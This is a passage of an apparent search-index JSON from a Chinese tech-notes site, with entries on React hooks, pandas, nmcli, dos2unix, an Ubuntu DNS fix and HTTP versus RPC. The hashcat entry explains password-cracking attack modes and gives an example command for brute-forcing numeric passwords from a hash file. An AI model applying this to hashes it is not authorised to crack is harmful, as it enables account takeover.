do1 , })) const do1 = () => { console . log ( 1 )} return ( < PSelect00 > p0 < /PSelect00> ) } // 父组件 const PSelect1 = () => { const refP0 = React . useRef < { do1 : ()=>{}} > () return ( < div > < PSelect0 onRef = { refP0 } /> < button onClick = {( e ) => refP0 . current ? . do1 ()} > 调用子组件 < /button> < /div> ) } 注解 useImperativeHandle 暴露的调用, 使用的时候一定要加括号...","tags":"前端","url":"/yq-docs-front-end-frame-react-hooks-useImperativeHandle.html","loc":"/yq-docs-front-end-frame-react-hooks-useImperativeHandle.html"},{"title":"hashcat","text":"hashcat 是流行, 快速一个密码爆破工具.\n支持在硬件上使用CPU、NVIDIA GPU、ATI GPU来进行密码破解. 相关资源 github地址: https://github.com/hashcat/hashcat 官网: https://hashcat.net/hashcat/ 文档: https://hashcat.net/wiki/ HashCat 主要分为三个版本： Hashcat 、 oclHashcat-plus 、 oclHashcat-lite 。\n这三个版本的主要区别是： HashCat 只支持CPU破解 oclHashcat-plus 支持使用GPU破解多个HASH，并且支持的算法高达77种 oclHashcat-lite 只支持使用GPU对单个HASH进行破解，支持的HASH种类仅有32种，\n但是对算法进行了优化，可以达到GPU破解的最高速度 如果只有单个密文进行破解的话，推荐使用 oclHashCat-lite 。 MacOS安装 brew install hashcat 选项参数 -a 指定要使用的破解模式，其值参考后面对参数。\n\"-a 0\"字典攻击，\"-a 1\" 组合攻击；\"-a 3\"掩码攻击。 0 Straight（字典破解）, 直接使用字典文件中的密码进行破解，逐个尝试每个密码。 1 Combination（组合破解） , 将两个或多个字典文件中的密码进行组合，生成新的密码进行破解 3 Brute-force（掩码暴力破解） , 掩码暴力破解 6 Hybrid dict + mask（混合字典+掩码） , 混合攻击：字典+掩码，将字典中密码与指定掩码结合破解 7 Hybrid mask + dict（混合掩码+字典） , 混合攻击：掩码+字典，先使用掩码模式生成密码，再与字典中密码结合破解 9 Association (联合攻击) , 结合多种攻击方式，如暴力破解、字典攻击等，以提高破解的效率和成功率 -m 指定要破解的hash类型，如果不指定类型，则默认是MD5 -o 指定输出位置\n指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中 -s tdout 指定基础文件 --force 强制进行破解, 忽略破解过程中的警告信息, 跑单条hash可能需要加上此选项 --show 显示已经破解的hash及该hash所对应的明文 --increment 启用增量破解模式, 你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程.\n如: Hashcat-m 1800 hashfile --increment --increment-min 6--increment-max 8 ?d?d?d?d?d?d?d?d ##破解hashfiel中纯数字密码，最小范围6位，最大8位 其中 ?d?d?d?d?d?d?d?d 代表8位纯数字密码. --increment-min 密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用 --increment-max 密码最大长度,同上 --outfile-format 指定破解结果的输出格式id,默认是3 --username 忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到 --remove 删除已被破解成功的hash -r 指定规则文件来使用自定义破解规则 -b 查看当前机器计算hash的算力 -V 查看版本 其他 hashcat其他套件工具: hashcat - 世界上最快、最先进的密码恢复实用程序 hashcat-utils - 在高级密码破解中有用的小型实用程序 https://github.com/hashcat/hashcat-utils maskprocessor - 具有逐位可配置字符集的高性能字发生器 https://github.com/hashcat/maskprocessor statsprocessor - 基于逐位马尔可夫链的词生成器 https://github.com/hashcat/statsprocessor princeprocessor - 使用PRINCE算法的独立密码候选生成器 https://github.com/hashcat/princeprocessor kwprocessor - 先进的键盘行走生成器，具有可配置的基片、键图和路线 https://github.com/hashcat/kwprocessor","tags":"安全","url":"/yq-docs-Safety-hashcat.html","loc":"/yq-docs-Safety-hashcat.html"},{"title":"pandas","text":"数据处理的库 相关资源: 官网: https://pandas.pydata.org/ 安装 pip install pandas 常见用法 读取 CSV import pandas as pd pd . read_csv () 创建DataFrame 使用字典创建DataFrame import pandas as pd data = { 'ID' : [ 101 , 102 , 103 , 104 , 105 ], 'Name' : [ 'Alice' , 'Bob' , 'Charlie' , 'David' , 'Eva' ], 'Age' : [ 25 , 30 , 22 , 35 , 28 ], 'Salary' : [ 50000 , 60000 , 45000 , 75000 , 55000 ], 'Status' : [ 'Active' , 'Inactive' , 'Active' , 'Active' , 'Inactive' ]} df = pd . DataFrame ( data ) 查看数据前几行 查看数据前3行, 不给参数默认前5行 df . head ( 3 ) 查看数据后几行 df . tail () 使用方式： 用于查看DataFrame的后几行，默认为后5行。 示例： 查看后3行数据。 df . tail ( 3 ) 查看数据基本信息 df . info () 使用方式： 提供DataFrame的基本信息，包括每列的非空值数量和数据类型。 示例： 查看数据信息。 df . info () 描述性统计信息 df . describe () 使用方式： 提供DataFrame的描述性统计信息，包括均值、标准差、最小值、25%分位数、中位数（50%分位数）、75%分位数和最大值。 示例： 查看数值列的统计信息。 df . describe () 选择列 df [ 'ColumnName' ] 使用方式： 通过列名选择DataFrame中的一列。 示例： 选择\"Salary\"列。 df [ 'Salary' ] 选择多列 df [[ 'Column1' , 'Column2' ]] 使用方式： 通过列名列表选择DataFrame中的多列。 示例： 选择\"Name\"和\"Age\"列。 df [[ 'Name' , 'Age' ]] 选择行 df . loc [ index ] 使用方式： 通过索引标签选择DataFrame中的一行。 示例： 选择索引为2的行。 df . loc [ 2 ] 选择特定行和列 df . loc [ index , 'ColumnName' ] 使用方式： 通过索引标签和列名选择DataFrame中的特定元素。 示例： 选择索引为1的行的\"Name\"列的值。 df . loc [ 1 , 'Name' ] 条件选择（Filtering） df [ df [ 'ColumnName' ] > value ] 使用方式： 使用条件过滤选择满足特定条件的行。 示例： 选择年龄大于25的行。 df [ df [ 'Age' ] > 25 ] 多条件选择 df [( df [ 'Column1' ] > value1 ) & ( df [ 'Column2' ] == value2 )] 使用方式： 使用逻辑运算符 （ & ：与， | ：或， ~ ： 非） 结合多个条件进行过滤。 示例： 选择年龄大于25且状态为\"Active\"的行。 df [( df [ 'Age' ] > 25 ) & ( df [ 'Status' ] == 'Active' )] 排序数据 df . sort_values ( by = 'ColumnName' , ascending = False ) 使用方式： 根据指定列的值进行升序或降序排序。 示例： 按工资降序排序。 df . sort_values ( by = 'Salary' , ascending = False ) 处理缺失值 df . dropna () 使用方式： 删除包含缺失值的行。 示例： 删除所有包含缺失值的行。 df . dropna () 填充缺失值 df . fillna ( value ) 使用方式： 用指定值填充缺失值。 示例： 用均值填充所有缺失值。 df . fillna ( df . mean ()) 新增列 df [ 'NewColumn' ] = values 使用方式： 新增一列，并为其赋值。 示例： 新增一列表示年龄是否大于30。 df [ 'IsAbove30' ] = df [ 'Age' ] > 30 删除列 df . drop ( 'ColumnName' , axis = 1 ) 使用方式： 删除指定列。 示例： 删除\"Status\"列。 df . drop ( 'Status' , axis = 1 ) 重命名列 df . rename ( columns = { 'OldName' : 'NewName' }, inplace = True ) 使用方式： 重命名指定列。 示例： 将\"ID\"列重命名为\"EmployeeID\"。 df . rename ( columns = { 'ID' : 'EmployeeID' }, inplace = True ) 分组统计 df . groupby ( 'ColumnName' ) . agg ({ 'Column1' : 'mean' , 'Column2' : 'sum' }) 使用方式： 按照指定列进行分组，然后进行聚合统计。 示例： 按状态分组，计算平均年龄和总工资。 df . groupby ( 'Status' ) . agg ({ 'Age' : 'mean' , 'Salary' : 'sum' }) 合并DataFrame pd . concat ([ df1 , df2 ], axis = 0 ) 使用方式： 沿着指定轴合并两个DataFrame。 示例： 垂直合并两个DataFrame。 pd . concat ([ df1 , df2 ], axis = 0 ) 横向合并DataFrame pd . concat ([ df1 , df2 ], axis = 1 ) 使用方式： 沿着列方向合并两个DataFrame。 示例： 横向合并两个DataFrame。 pd . concat ([ df1 , df2 ], axis = 1 ) 合并DataFrame（基于键） pd . merge ( df1 , df2 , on = 'KeyColumn' , how = 'inner' ) 使用方式： 使用指定列进行合并，指定合并方式（内连接、左连接、右连接、外连接）。 示例： 使用\"ID\"列内连接两个DataFrame。 pd . merge ( df1 , df2 , on = 'ID' , how = 'inner' ) 透视表 pd . pivot_table ( df , values = 'ValueColumn' , index = 'IndexColumn' , columns = 'ColumnToPivot' , aggfunc = 'mean' ) 使用方式： 创建透视表，汇总数据。 示例： 创建一个透视表，计算不同状态下的平均工资。 pd . pivot_table ( df , values = 'Salary' , index = 'Status' , aggfunc = 'mean' ) 独热编码 pd . get_dummies ( df , columns = [ 'CategoricalColumn' ]) 使用方式： 将分类变量转换为独热编码。 示例： 对\"Status\"列进行独热编码。 pd . get_dummies ( df , columns = [ 'Status' ]) 字符串处理 df [ 'StringColumn' ] . str . method () 使用方式： 对字符串列进行各种处理，如切片、替换等。 示例： 将\"Name\"列转换为大写。 df [ 'Name' ] . str . upper () 日期时间处理 df [ 'DateTimeColumn' ] = pd . to_datetime ( df [ 'DateTimeColumn' ]) 重点说明： 将字符串列转换为日期时间类型。 示例： 将\"Date\"列转换为日期时间类型。 df [ 'Date' ] = pd . to_datetime ( df [ 'Date' ]) 时间序列重采样 df . resample ( 'D' ) . sum () 使用方式： 对时间序列数据进行重新采样。 示例： 将数据按天重新采样并求和。 df . resample ( 'D' ) . sum () 滑动窗口 df [ 'Column' ] . rolling ( window = size ) . mean () 使用方式： 计算滑动窗口的统计量，如均值。 示例： 计算\"Salary\"列的3天滑动平均值。 df [ 'Salary' ] . rolling ( window = 3 ) . mean () 绘制图表 df . plot ( x = 'Column1' , y = 'Column2' , kind = 'scatter' ) 使用方式： 使用内置的绘图功能绘制各种图表。 示例： 绘制散点图。 df . plot ( x = 'Age' , y = 'Salary' , kind = 'scatter' ) 保存DataFrame到文件 df . to_csv ( 'filename.csv' , index = False ) 使用方式： 将DataFrame保存为CSV文件。 示例： 将DataFrame保存为CSV文件。 df . to_csv ( 'employee_data.csv' , index = False ) 从文件加载数据到DataFrame df = pd . read_csv ( 'filename.csv' ) 使用方式： 从文件中加载数据到DataFrame。 示例： 从CSV文件加载数据。 df = pd . read_csv ( 'employee_data.csv' ) 使用apply函数对列进行操作 df [ 'NewColumn' ] = df [ 'Column' ] . apply ( lambda x : x * 2 ) 使用方式： 使用apply函数对某列的每个元素进行操作，可传递自定义函数。 示例： 将\"Age\"列的每个元素乘以2。 df [ 'DoubleAge' ] = df [ 'Age' ] . apply ( lambda x : x * 2 ) 使用map函数进行值替换 df [ 'Status' ] = df [ 'Status' ] . map ({ 'Active' : 1 , 'Inactive' : 0 }) 使用方式： 使用map函数根据字典或函数替换列中的值。 示例： 将\"Status\"列的值映射为1和0。 df [ 'Status' ] = df [ 'Status' ] . map ({ 'Active' : 1 , 'Inactive' : 0 }) 使用cut函数进行分箱处理 df [ 'AgeGroup' ] = pd . cut ( df [ 'Age' ], bins = [ 20 , 30 , 40 , 50 ], labels = [ '20-30' , '30-40' , '40-50' ]) 使用方式： 使用cut函数将数值列分成不同的箱子，用标签表示。 示例： 将\"Age\"列分成年龄组。 df [ 'AgeGroup' ] = pd . cut ( df [ 'Age' ], bins = [ 20 , 30 , 40 , 50 ], labels = [ '20-30' , '30-40' , '40-50' ]) 使用groupby和transform进行组内操作 df [ 'MeanSalaryByAge' ] = df . groupby ( 'Age' )[ 'Salary' ] . transform ( 'mean' ) 使用方式： 使用groupby和transform在组内进行操作，并将结果广播到原始DataFrame。 示例： 计算每个年龄组的平均工资。 df [ 'MeanSalaryByAge' ] = df . groupby ( 'Age' )[ 'Salary' ] . transform ( 'mean' ) 使用astype进行数据类型转换 df [ 'NewColumn' ] = df [ 'Column' ] . astype ( float ) 使用方式： 使用astype将列的数据类型转换为指定类型。 示例： 将\"Age\"列转换为浮点数类型。 df [ 'Age' ] = df [ 'Age' ] . astype ( float ) 使用isin进行过滤 df [ df [ 'Column' ] . isin ([ 'value1' , 'value2' ])] 使用方式： 使用isin过滤包含在给定列表中的值的行。 示例： 选择\"Name\"列包含特定值的行。 df [ df [ 'Name' ] . isin ([ 'Alice' , 'Bob' ])] 使用duplicated和drop_duplicates处理重复值 df . duplicated ( subset = [ 'Column1' , 'Column2' ]) df . drop_duplicates ( subset = [ 'Column1' , 'Column2' ], keep = 'first' ) 使用方式： 使用duplicated检测重复值，使用drop_duplicates删除重复值。 示例： 查找并删除重复行。 df . duplicated ( subset = [ 'Name' ]) df . drop_duplicates ( subset = [ 'Name' ], keep = 'first' ) 使用nlargest和nsmallest获取最大和最小值 df . nlargest ( 5 , 'ColumnName' ) df . nsmallest ( 5 , 'ColumnName' ) 使用方式： 使用nlargest获取最大值，使用nsmallest获取最小值。 示例： 获取工资最高的前5名和最低的前5名员工。 df . nlargest ( 5 , 'Salary' ) df . nsmallest ( 5 , 'Salary' ) 使用value_counts计算唯一值的频率 df [ 'Column' ] . value_counts () 使用方式： 使用value_counts计算某列中每个唯一值的频率。 示例： 计算\"Status\"列中每个状态的数量。 df [ 'Status' ] . value_counts () 使用str.contains进行模糊匹配 df [ df [ 'Column' ] . str . contains ( 'pattern' , case = False , na = False )] 使用方式： 使用str.contains进行模糊匹配，可指定大小写敏感和处理缺失值。 示例： 选择\"Name\"列包含字母\"A\"的行。 df [ df [ 'Name' ] . str . contains ( 'A' , case = False , na = False )] 使用replace进行值替换 df . replace ({ 'OldValue' : 'NewValue' }) 使用方式： 使用replace替换DataFrame中的值。 示例： 将\"Status\"列中的\"Active\"替换为\"ActiveStatus\"。 df . replace ({ 'Active' : 'ActiveStatus' }) 使用pivot进行数据透视 df . pivot ( index = 'IndexColumn' , columns = 'ColumnToPivot' , values = 'ValueColumn' ) 使用方式： 使用pivot进行数据透视。 示例： 创建一个数据透视表。 df . pivot ( index = 'ID' , columns = 'Status' , values = 'Salary' ) 使用merge时处理重复列名 pd . merge ( df1 , df2 , left_on = 'LeftColumn' , right_on = 'RightColumn' , suffixes = ( '_left' , '_right' )) 使用方式： 在使用merge时，处理两个DataFrame中相同列名的情况。 示例： 合并两个DataFrame，处理重复列名。 pd . merge ( df1 , df2 , left_on = 'ID' , right_on = 'ID' , suffixes = ( '_left' , '_right' )) 使用at和iat快速访问元素 df . at [ index , 'ColumnName' ] df . iat [ index , columnIndex ] 使用方式： 使用at和iat快速访问DataFrame中的元素。 示例： 获取第2行的\"Name\"列的值。 df . at [ 1 , 'Name' ] 使用mask进行条件替换 df [ 'NewColumn' ] = df [ 'Column' ] . mask ( df [ 'Condition' ]) 使用方式： 使用mask根据条件替换值。 示例： 根据\"Salary\"列的条件进行替换。 df [ 'Bonus' ] = df [ 'Salary' ] . mask ( df [ 'Salary' ] > 60000 , 'HighBonus' ) 使用query进行条件查询 df . query ( 'Column > value' ) 使用方式： 使用query进行条件查询。 示例： 查询\"Age\"大于25的行。 df . query ( 'Age > 25' ) 使用crosstab进行交叉表 pd . crosstab ( df [ 'Column1' ], df [ 'Column2' ]) 使用方式： 使用crosstab生成交叉表。 示例： 生成\"Status\"和\"Age\"之间的交叉表。 pd . crosstab ( df [ 'Status' ], df [ 'Age' ]) 使用explode展开列表 df . explode ( 'ListColumn' ) 使用方式： 使用explode展开包含列表的列。 示例： 展开\"Hobbies\"列的列表。 df . explode ( 'Hobbies' ) 使用agg进行多个聚合操作 df . groupby ( 'GroupColumn' ) . agg ({ 'Column1' : 'mean' , 'Column2' : [ 'min' , 'max' ]}) 使用方式： 使用agg同时进行多个聚合操作。 示例： 计算每个组的平均值、最小值和最大值。 df . groupby ( 'Status' ) . agg ({ 'Salary' : [ 'mean' , 'min' , 'max' ]}) 使用pipe进行链式操作 df . pipe ( func1 ) . pipe ( func2 , arg1 = 'value' ) . pipe ( func3 ) 使用方式： 使用pipe进行链式操作，将多个操作组合在一起。 示例： 使用pipe调用多个自定义函数。 df . pipe ( func1 ) . pipe ( func2 , arg1 = 'value' ) . pipe ( func3 ) 此节参考: 50个核心Pandas操作！","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pandas.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pandas.html"},{"title":"nmcli","text":"配置网络管理器 (NetworkManager) 如, 要将名为 eth0 的有线网络接口配置为自动连接: sudo nmcli connection modify eth0 connection.autoconnect yes 用法: nmcli [选项] 对象 { 命令 | help } 对象: g[eneral]       NetworkManager 的常规状态和操作\nn[etworking]    整体网络控制\nr[adio]         NetworkManager 无线电开关\nc[onnection]    NetworkManager 的连接\nd[evice]        NetworkManager 管理的设备\na[gent]         NetworkManager 机密（secret）或 polkit 代理\nm[onitor]       监视 NetworkManager 更改 选项参数: -a, --ask                                询问缺少的参数\n-c, --colors auto|yes|no                 是否在输出中使用颜色\n-e, --escape yes|no                      转义值中的列分隔符\n-f, --fields <字段,...>|all|common       指定要输出的字段\n-g, --get-values <字段,...>|all|common   -m tabular -t -f 的快捷方式\n-h, --help                               打印此帮助\n-m, --mode tabular|multiline             输出模式\n-o, --overview                           概览模式\n-p, --pretty                             美化输出\n-s, --show-secrets                       允许显示密码\n-t, --terse                              简介输出\n-v, --version                            显示程序版本\n-w, --wait <秒数>                        设定操作完成的等待超时 对象 device 用法: nmcli device { 命令 | help } 命令: := { status | show | set | connect | reapply | modify | disconnect | delete | monitor | wifi | lldp }\n\nstatus\n\nshow [<接口名称>]\n\nset [ifname] <接口名称> [autoconnect yes|no] [managed yes|no]\n\nconnect <接口名称>\n\nreapply <接口名称>\n\nmodify <接口名称> ([+|-]<设置>.<属性> <值>)+\n\ndisconnect <接口名称> ...\n\ndelete <接口名称> ...\n\nmonitor <接口名称> ...\n\nwifi [list [ifname <接口名称>] [bssid <BSSID>] [--rescan yes|no|auto]]\n\nwifi connect <(B)SSID> [password <密码>] [wep-key-type key|phrase] [ifname <接口名称>]\n                       [bssid <BSSID>] [name <名称>] [private yes|no] [hidden yes|no]\n\nwifi hotspot [ifname <接口名称>] [con-name <名称>] [ssid <SSID>] [band a|bg] [channel <信道>] [password <密码>]\n\nwifi rescan [ifname <接口名称>] [[ssid <要扫描的 SSID>] ...]\n\nwifi show-password [ifname <接口名称>]\n\nlldp [list [ifname <接口名称>]]","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-nmcli.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-nmcli.html"},{"title":"记录一次Ubuntu的DNS解析问题","text":"当使用虚拟机Ubuntu拉东西时, 偶然发现拉不下来, 记录一下问题与解决. 使用fluter时候, 发现拉包失败, 先ping了下 ping pub.flutter-io.cn 发现是解析问题,\n再看 dns 配置发现明显不对 比较奇怪的是, 我使用的是 Ubuntu 的桌面版, 在桌面的设置里面是有DNS配置的且与 reslove 内的不一致. 试了下手动将这个解析地址放到 /etc/resolv.conf 内, 就可以了. 查了一下 127.0.0.53 地址 在Ubuntu系统中， systemd-resolved 是一个网络名称解析服务，它提供了名称解析服务给本地应用程序，包括DNS解析。 127.0.0.53 是 systemd-resolved 服务使用的本地回环地址，\n它监听在这个地址上，以便处理来自本地应用程序的DNS查询请求。\n当你的系统需要解析一个域名时，它会向 127.0.0.53 发送请求，\n然后 systemd-resolved 服务会处理这个请求，查询实际的DNS服务器，并将结果返回给请求者。 使用本地回环地址作为DNS服务器有以下几个好处： 安全性：通过在本地处理DNS请求，可以减少网络中的DNS请求，降低被恶意第三方监听或篡改的风险。 速度：本地DNS解析比通过网络发送到外部DNS服务器要快，这样可以提高域名解析的速度。 灵活性：systemd-resolved 服务可以根据配置文件中设置的DNS服务器列表，进行负载均衡或者故障转移，确保名称解析服务的稳定性。 配置简便：用户不需要手动编辑 /etc/resolv.conf 文件，所有的DNS配置都可以通过 systemd-resolved 的配置文件进行管理，简化了配置过程。 如果你希望更改系统的DNS服务器，你应该修改 systemd-resolved 的配置文件或者通过网络管理器的图形界面进行设置。\n直接编辑 /etc/resolv.conf 文件可能不会有持久的效果，\n因为 systemd-resolved 服务可能会在每次启动时重新生成这个文件。\n正确的做法是编辑 /etc/systemd/resolved.conf 文件，并使用 systemctl restart systemd-resolved 命令来重启服务，使更改生效。 配置参考: [Resolve]\nDNS=9.9.9.9 8.8.8.8\nFallbackDNS=1.1.1.1 1.0.0.1\n# 这里 DNS 指定了主要的DNS服务器，而 FallbackDNS 指定了备选DNS服务器。 所以文头说的 明显不对 是错的, 忽略;\n至于为什么之前只请求到 53 地址而没找图形界面管理器里的DNS,\n感觉是跟 NetworkManager 有冲突? 究竟是不是就不得而知了,\n先记录下来吧. 注解 这里涉及到的 /etc/resolv.conf 文件是一个临时的文件, 每次重启都会刷新.\n如果要永久保存, 一种方式是在 /etc/network/interfaces 文件内手动配置网卡. 再者就是得研究一下 /etc/resolv.conf 的生成机制了,\n一种可能得是更新 /etc/systemd/resolved.conf 里 [Resolve]部分 的 DNS 字段(当systemd-resolved服务在管理DNS解析)并重启\n详细的这里暂不讨论.","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-ubuntu-dns-parse-problem.html","loc":"/yq-docs-operating-system-linux-question-ubuntu-dns-parse-problem.html"},{"title":"dos2unix","text":"换行符转换工具.\n将文本文件中的换行符从 Windows 格式（回车加换行，即 \\r\\n 或 CRLF）转换为 Unix/Linux 格式（仅换行符，即 \\n 或 LF） 安装 apt install dos2unix 用法： dos2unix [ 选项 ] [ 文件 ... ] [ -n 输入文件 输出文件 ... ] 参数选项: --allow-chown         允许修改文件所有者\n-ascii                只转换换行符（默认）\n-iso                  在 DOS 和 ISO-8859-1 字符集之间转换\n  -1252               使用Windows 1252 编码页（西欧）\n  -437                使用DOS 437 编码页（US）（默认）\n  -850                使用DOS 850 编码页（西欧）\n  -860                使用DOS 860 编码页（葡萄牙）\n  -863                使用DOS 863 编码页（加拿大法語）\n  -865                使用DOS 865 编码页（北欧）\n-7                    转换8 位字符到7 位空间\n-b, --keep-bom         保留UTF-8 BOM头\n-c, --convmode        转换模式\n  convmode            ascii、7bit、iso或mac，默认为ascii\n-f, --force           强制转换二进制文件\n-h, --help            显示本说明文字\n-i, --info[=FLAGS]    显示文件信息\n  文件 ...            需要分析的文件\n-k, --keepdate        保留输出文件时间\n-L, --license         显示软件协议\n-l, --newline         加入额外的换行符\n-m, --add-bom         添加UTF-8 BOM头（默认为UTF-8）\n-n, --newfile         写入新文件\n  infile              新文件模式中的原始文件\n  outfile             新文件模式中的输出文件\n--no-allow-chown      不允许修改文件所有者（默认选项）\n-o, --oldfile         写入原文件（默认）\n  file ...            旧文件模式中要转换的文件\n-q, --quiet           安静模式，不显示所有警告\n-r, --remove-bom         移除UTF-8 BOM头（默认）\n-s, --safe            跳过二进制文件(默认)\n-u,  --keep-utf16     保留UTF-16编码\n-ul, --assume-utf16le 假定输入文件格式为UTF-16LE\n-ub, --assume-utf16be 假定输入文件格式为UTF-16BE\n-v,  --verbose        显示更多信息\n-F, --follow-symlink  根据符号链接转换其目标文件\n-R, --replace-symlink 取代符号链接为转换后的文件\n                        (原链接目标文件保持不变)\n-S, --skip-symlink    保持符号链接及其目标不变（默认）\n-V, --version         显示版本号 用例 将当前目录下所有文件转换为unix格式 dos2unix * 如果还包含子文件夹, 可以结合find find ./ | xargs dos2unix","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-dos2unix.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-dos2unix.html"},{"title":"HTTP认识","text":"HTTP, 超文本传输协议, 不提供数据包的传输功能. 属于 应用层协议 本质为: 客户端和服务端约定好的一种通信格式 (就像秦始皇的车同轨书同文). OSI七层模型 自底向上依次 物理层 数据链路层 网络层 传输层: TCP就在这层, 规定需使用 字节流 传输. 会话层 表示层 应用层 TCP传输层 TCP传输层规定需使用 字节流 传输.\n但是很容易产生 TCP 粘包, 导致接收方无法理解哪些字节流属于同一个请求，这就是裸 TCP 连接的不可用性.\n因此对于传输层的数据, 需要制定一个让对方通过 TCP 连接能看的懂的说明（类似于 OSI 表示层的作用）. RPC （实际上 RPC 底层既可以是 TCP 也可以是 UDP） 和 HTTP 就是当前最流行的该说明的实现，\n它们都将数据分为头部和数据两个部分，两部分天然用空行分隔防止粘包，\n并在头部中指定数据部分大小，这样当接收方接收到数据后就能根据数据大小取出相应的字节流 HTTP状态码 状态码 描述 200 OK 201 Created 202 Accepted 301 Moved Permanently 302 Found 303 See Other 304 Not Modified 400 Bad Request 401 Unauthorized 403 Forbidden 404 Not Found 405 Method Not Allowed 406 Not Acceptable 407 Proxy Authentication Required 408 Request Timeout 409 Conflict 410 Gone 411 Length Required 412 Precondition Failed 413 Request Entity Too Large 414 Request-URI Too Long 415 Unsupported Media Type 416 Requested Range Not Satisfiable 417 Expectation Failed 500 Internal Server Error 501 Not Implemented 502 Bad Gateway 503 Service Unavailable 504 Gateway Timeout 505 HTTP Version Not Supported 浏览器访问总是返回304 因为浏览器会缓存之前请求过的文件。 当再次请求同一文件时,浏览器会先向服务器确认文件是否有更新,\n如果没有更新则返回304状态码,使用缓存文件。\n这是浏览器的默认缓存行为,可以通过开发者工具清除缓存来避免。 当浏览器再次请求同一文件时,它会使用HTTP协议中的条件请求头来询问服务器该文件是否有更新。\n主要有两种方式: ETag ETag是服务器为每个资源生成的一个唯一标识符。\n当浏览器第一次请求资源时,服务器会在响应头中包含这个ETag。\n之后浏览器重新请求同一资源时,会将之前收到的ETag添加到请求头If-None-Match中发送给服务器。\n服务器收到后会比对ETag, 如果资源没有更新, 则返回304状态码, 告知浏览器可以使用缓存的资源。 Last-Modified 服务器在响应头中包含一个Last-Modified字段,表示资源的最后修改时间。\n浏览器后续请求时,会将前一次收到的Last-Modified时间作为请求头If-Modified-Since的值发送。\n服务器收到后比对资源的实际修改时间,如果资源没有更新,则返回304状态码。 杂谈-RPC RPC(Remote Procedure Call：远程方法调用，即可以像调用本地方法一样调用远端方法),\n远程过程调用, 是一种通信协议, 是一种远程过程调用技术, 是一种分布式计算技术、 设计模式. 跨越了 OSI 7层模型的 传输层 到 应用层 .\n其调用协议通常包含： 传输协议 和 序列化协议 。 传输协议 比如著名的 grpc，它底层使用的是 http2 协议；还有 dubbo 一类的自定义报文的 tcp 协议 序列化协议 例如基于文本编码的 json 协议；也有二进制编码的 protobuf、hession 等协议；还有针对 java 高性能、高吞吐量的 kryo 和 ftc 等序列化协议 大部人理解误区的问题应该是： 为什么要使用自定义 tcp 协议的 rpc 做后端进程通信？ . RPC 比 HTTP 早出现 20 年左右，那为什么有了 RPC 之后还需要创建 HTTP 协议呢？\n最主要原因： 首先 RPC 只是一种实现方式（不是协议）针对这个实现方式不同的使用者可以定制不同的基于 RPC 的协议，\n因此有许多基于 RPC 的协议例如 thrift 和 gRPC； 由于其灵活性，在 HTTP 还未出现之前，许多组织和机构都针对性的制定了自己的 RCP 协议，\n例如我们平常使用安全卫士调用远程方法进行病毒查杀的时候，就用的是基于 RPC 的协议，\n这种方案当一个公司主要业务是向客户提供服务时（C/S 模式）是可行的，\n但考虑例如浏览器这样的业务（B/S 模式）浏览器同时需要提供自身服务器的服务和调用其他组织服务器的服务，\n那就可能会涉及多个 RPC 协议，这显然不能接受，于是一个统一的标准协议 HTTP 就诞生了；\n实际上如今越来越多的软件都是 B/S 模式，既可以在手机，平板上使用，也可以在浏览器上使用，\nRPC 逐渐被 HTTP 大范围取代，目前主要用于公司内部的微服务提供；\n其次：随着 HTTP 版本的优化，HTTP 2 在数据传输方面（头部压缩等机制）相对于 RPC 的优势更加明显，这也是 HTTP 逐渐取代 RPC 的原因； HTTP与RPC区别 连接池原生支持 基于 TCP 的 RPC 协议底层默认是 TCP 长连接，但在此基础之上，RCP 协议还创建了连接池的概念，\n就是建立一个用于存放 TCP 连接的池子，当下次需要使用的时候直接从池中取出对应连接进行复用即可，\n这缓解了服务器压力，适合高并发的情况； HTTP 本身没有默认支持连接池，不过许多编程语言都增加了 HTTP 的连接池功能; 数据传输方面 在传输数据时我们应该尽可能将其转换为二进制形式（序列化）方便计算机识别，避免无谓的资源消耗 字符串可以通过哈夫曼编码转换为二进制形式 数字天然就可以转换为二进制形式 结构体数据 在 HTTP 2 出现头部压缩之前，HTTP 1.x 主要是通过 Json 实现 RPC 主要是通过 protobuf 实现数据的序列化 (protobuf 的实现更加轻量级，效率更高) 通信协议 HTTP 使用文本协议，RPC 使用二进制协议。 调用方式 HTTP 接口通过 URL 进行调用，RPC 接口通过函数调用进行调用。 参数传递方式 HTTP 接口使用 URL 参数或者请求体进行参数传递，RPC 接口使用函数参数进行传递。 接口描述方式 HTTP 接口使用 RESTful 架构描述接口，RPC 接口使用接口定义语言（IDL）描述接口。 性能表现不同 RPC 接口通常比 HTTP 接口更快，因为它使用二进制协议进行通信，而且使用了一些性能优化技术，例如连接池、批处理等。此外，RPC 接口通常支持异步调用，可以更好地处理高并发场景。 应用场景 HTTP 接口适用于 Web 应用程序和浏览器之间的通信。\n它通常用于传输 HTML、CSS、JavaScript 和其他 Web 资源，以及 RESTful 风格的 API 服务。 RPC 接口适用于分布式系统之间的通信。\n它可以在多种编程语言之间进行通信，支持多种协议和数据格式。\nRPC 接口通常用于处理高并发、高吞吐量的场景，例如大型的分布式计算、大数据处理等。 HTTP 接口和 RPC 接口的相同之处在于，它们都是用于接口通信的协议。\n它们都需要定义接口、参数和返回值等信息，并通过网络进行通信。\n此外，它们都支持多种数据格式的编解码，可以根据需求进行灵活的选择。 属于两个维度, HTTP是通信协议, RPC是远程过程调用(调用远程服务器的本地方法, 相反的是自己调用自己本地方法). RPC可以基于HTTP使用, 也可以基于其他协议(如TCP)使用, 一般都是基于TCP, 因为TCP协议在传输层, 比HTTP的应用层更底层, 传输更快. RPC是面向过程的，最终的目的就是为了传输对象，所以只需要网络通信+对象的序列化和反序列化就行了\n(rpc关注的应该是传输协议和序列化协议) HTTP冗余度，复杂性，性能都不太行，而且还要指定ip端口，请求资源路径等等 至于为什么使用封装好的RPC, 一是因为RPC不局限于使用HTTP协议(HTTP协议较冗余) 二是都是内部使用(很少有给外部提供直接调用方法的), 不用考虑通用性(HTTP通用性较好) 技巧 一般RPC都是对内, HTTP对外使用 为什么要使用自定义 tcp 协议的 rpc 做后端进程通信？ 